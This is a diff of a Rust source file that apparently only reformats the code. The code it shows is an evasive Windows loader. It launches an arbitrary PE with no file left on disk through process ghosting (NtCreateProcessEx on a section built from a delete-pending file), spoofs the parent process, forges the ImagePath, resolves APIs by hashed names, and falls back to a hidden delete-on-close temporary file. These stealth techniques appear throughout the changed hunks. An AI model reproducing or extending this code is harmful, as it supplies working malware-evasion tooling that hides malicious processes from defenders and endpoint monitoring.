@@ -94,10 +94,7 @@ const PARENT_POOL: &[&str] = &[
 ];
 
 /// Try to spawn `pe` with no residual on-disk host image + PPID spoof. Returns piped child.
-pub fn spawn_host_zero_disk(
-    pe: &[u8],
-    parent_name: &str,
-) -> Result<SpoofedPipedChild, String> {
+pub fn spawn_host_zero_disk(pe: &[u8], parent_name: &str) -> Result<SpoofedPipedChild, String> {
     if pe.len() < 0x200 || pe[0] != b'M' || pe[1] != b'Z' {
         return Err("not a PE".into());
     }
@@ -118,7 +115,9 @@ pub fn spawn_host_zero_disk(
         // Fallback: delete-on-close CreateProcess (PPID via PROC_THREAD_ATTRIBUTE)
         match unsafe { delete_on_close_createprocess(pe, parent_name) } {
             Ok(c) => {
-                crate::utils::db_print("[host] zero-residual: delete-on-close+PPID CreateProcess ok");
+                crate::utils::db_print(
+                    "[host] zero-residual: delete-on-close+PPID CreateProcess ok",
+                );
                 Ok(c)
             }
             Err(e) => Err(format!("zero-disk paths failed: {e}")),
@@ -163,8 +162,7 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
 
     // --- pipes ---
     let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
-    type CreatePipeFn =
-        unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u32) -> i32;
+    type CreatePipeFn = unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u32) -> i32;
     type SetHandleInformationFn = unsafe extern "system" fn(usize, u32, u32) -> i32;
     let create_pipe: CreatePipeFn = transmute_api(k32, b"CreatePipe")?;
     let set_hi: SetHandleInformationFn = transmute_api(k32, b"SetHandleInformation")?;
@@ -184,13 +182,7 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
     let mut stdin_w = 0usize;
     let mut stdout_r = 0usize;
     let mut stdout_w = 0usize;
-    if create_pipe(
-        &mut stdin_r,
-        &mut stdin_w,
-        &mut sa as *mut _ as *mut u8,
-        0,
-    ) == 0
-    {
+    if create_pipe(&mut stdin_r, &mut stdin_w, &mut sa as *mut _ as *mut u8, 0) == 0 {
         return Err("CreatePipe stdin".into());
     }
     if create_pipe(
@@ -239,8 +231,7 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
         usize,
         u32,
     ) -> i32;
-    let nt_create_process_ex: NtCreateProcessExFn =
-        transmute_api(ntdll, b"NtCreateProcessEx")?;
+    let nt_create_process_ex: NtCreateProcessExFn = transmute_api(ntdll, b"NtCreateProcessEx")?;
 
     let mut h_process: usize = 0;
     let st = nt_create_process_ex(
@@ -276,14 +267,9 @@ unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPip
     };
 
     // Process parameters: spoofed ImagePath + std handles (pipes)
-    if let Err(e) = write_process_parameters(
-        h_process,
-        ntdll,
-        stdin_r,
-        stdout_w,
-        stdout_w,
-        parent_label,
-    ) {
+    if let Err(e) =
+        write_process_parameters(h_process, ntdll, stdin_r, stdout_w, stdout_w, parent_label)
+    {
         let _ = crate::native::close_handle(h_process);
         cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
         return Err(e);
@@ -413,13 +399,8 @@ unsafe fn create_image_section_from_pe(pe: &[u8]) -> Result<(usize, std::path::P
         delete_file: u8,
     }
     let mut disp = FileDispositionInfo { delete_file: 1 };
-    type NtSetInformationFileFn = unsafe extern "system" fn(
-        usize,
-        *mut IoStatusBlock,
-        *mut u8,
-        u32,
-        u32,
-    ) -> i32;
+    type NtSetInformationFileFn =
+        unsafe extern "system" fn(usize, *mut IoStatusBlock, *mut u8, u32, u32) -> i32;
     if let Ok(nt_set) = transmute_api::<NtSetInformationFileFn>(ntdll, b"NtSetInformationFile") {
         // FileDispositionInformation = 13
         let _ = nt_set(
@@ -460,15 +441,8 @@ unsafe fn create_image_section_from_pe(pe: &[u8]) -> Result<(usize, std::path::P
         return Err(format!("NtWriteFile 0x{:08X}", st as u32));
     }
 
-    type NtCreateSectionFn = unsafe extern "system" fn(
-        *mut usize,
-        u32,
-        usize,
-        *mut i64,
-        u32,
-        u32,
-        usize,
-    ) -> i32;
+    type NtCreateSectionFn =
+        unsafe extern "system" fn(*mut usize, u32, usize, *mut i64, u32, u32, usize) -> i32;
     let nt_create_section: NtCreateSectionFn = transmute_api(ntdll, b"NtCreateSection")?;
     let mut h_section: usize = 0;
     let mut max_size: i64 = 0;
@@ -493,8 +467,7 @@ unsafe fn remote_entry_point(h_process: usize, pe: &[u8]) -> Result<usize, Strin
     let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
     type NtQueryInformationProcessFn =
         unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
-    let nt_qip: NtQueryInformationProcessFn =
-        transmute_api(ntdll, b"NtQueryInformationProcess")?;
+    let nt_qip: NtQueryInformationProcessFn = transmute_api(ntdll, b"NtQueryInformationProcess")?;
     let mut pbi: ProcessBasicInformation = std::mem::zeroed();
     let mut ret = 0u32;
     // ProcessBasicInformation = 0
@@ -630,11 +603,11 @@ unsafe fn write_process_parameters(
     // StandardInput  = 0x20  NO — that's wrong for normalized.
     // Public layout (x64):
     // +0x00 MaximumLength
-    // +0x08 Length  
+    // +0x08 Length
     // +0x10 Flags
     // ...
     // +0xA0 StandardInput
-    // +0xA8 StandardOutput  
+    // +0xA8 StandardOutput
     // +0xB0 StandardError
     // These offsets vary; write via fields if Length is large enough.
     let stdin_off = 0xA0usize;
@@ -650,14 +623,8 @@ unsafe fn write_process_parameters(
     let local_len = ptr::read_unaligned(p.add(0) as *const u32) as usize; // MaximumLength
     let copy_len = local_len.max(0x100).min(0x2000);
 
-    type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-        usize,
-        *mut usize,
-        usize,
-        *mut usize,
-        u32,
-        u32,
-    ) -> i32;
+    type NtAllocateVirtualMemoryFn =
+        unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;
     let nt_avm: NtAllocateVirtualMemoryFn = transmute_api(ntdll, b"NtAllocateVirtualMemory")?;
     let mut remote_base: usize = 0;
     let mut region = copy_len;
@@ -671,11 +638,15 @@ unsafe fn write_process_parameters(
     );
     if st < 0 || remote_base == 0 {
         type RtlDestroyProcessParametersFn = unsafe extern "system" fn(usize) -> i32;
-        if let Ok(d) = transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
+        if let Ok(d) =
+            transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
         {
             let _ = d(params);
         }
-        return Err(format!("NtAllocateVirtualMemory params 0x{:08X}", st as u32));
+        return Err(format!(
+            "NtAllocateVirtualMemory params 0x{:08X}",
+            st as u32
+        ));
     }
 
     type NtWriteVirtualMemoryFn =
@@ -690,8 +661,7 @@ unsafe fn write_process_parameters(
     // PEB.ProcessParameters at +0x20 x64
     type NtQueryInformationProcessFn =
         unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
-    let nt_qip: NtQueryInformationProcessFn =
-        transmute_api(ntdll, b"NtQueryInformationProcess")?;
+    let nt_qip: NtQueryInformationProcessFn = transmute_api(ntdll, b"NtQueryInformationProcess")?;
     let mut pbi: ProcessBasicInformation = std::mem::zeroed();
     let mut ret = 0u32;
     let st = nt_qip(
@@ -716,7 +686,8 @@ unsafe fn write_process_parameters(
     }
 
     type RtlDestroyProcessParametersFn = unsafe extern "system" fn(usize) -> i32;
-    if let Ok(d) = transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
+    if let Ok(d) =
+        transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
     {
         let _ = d(params);
     }
@@ -766,15 +737,8 @@ unsafe fn delete_on_close_createprocess(
     std::fs::write(&path, pe).map_err(|e| format!("write: {e}"))?;
 
     // Open with DELETE_ON_CLOSE so path dies when all handles close
-    type CreateFileWFn = unsafe extern "system" fn(
-        *const u16,
-        u32,
-        u32,
-        usize,
-        u32,
-        u32,
-        usize,
-    ) -> usize;
+    type CreateFileWFn =
+        unsafe extern "system" fn(*const u16, u32, u32, usize, u32, u32, usize) -> usize;
     let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
     let create_file: CreateFileWFn = transmute_api(k32, b"CreateFileW")?;
     let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
@@ -784,7 +748,7 @@ unsafe fn delete_on_close_createprocess(
         0x8000_0000 | 0x0001_0000,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         0,
-        3, // OPEN_EXISTING
+        3,                                                              // OPEN_EXISTING
         0x0400_0000 | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, // DELETE_ON_CLOSE
         0,
     );
